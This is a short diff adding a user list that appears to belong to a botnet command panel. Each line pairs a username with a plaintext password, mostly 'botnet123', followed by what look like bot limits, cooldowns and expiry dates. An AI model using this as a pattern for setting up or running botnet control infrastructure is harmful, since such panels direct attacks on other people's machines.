@@ -1,0 +1,9 @@
+root root123 3 100 9/9/9999
+buzzed home420 3 86400 99/99/9999
+unholy skidsec 3 86400 99/99/9999
+ash nets0x1 3 86400 99/99/9999
+love botnet123 2 60000 99/99/9999
+graydon botnet123 2 86400 99/99/9999
+myxv botnet123 2 86400 99/99/9999
+sxns botnet123 3 86400 99/99/9999
+BeesNet botnet123 1 86400 8/4/2023
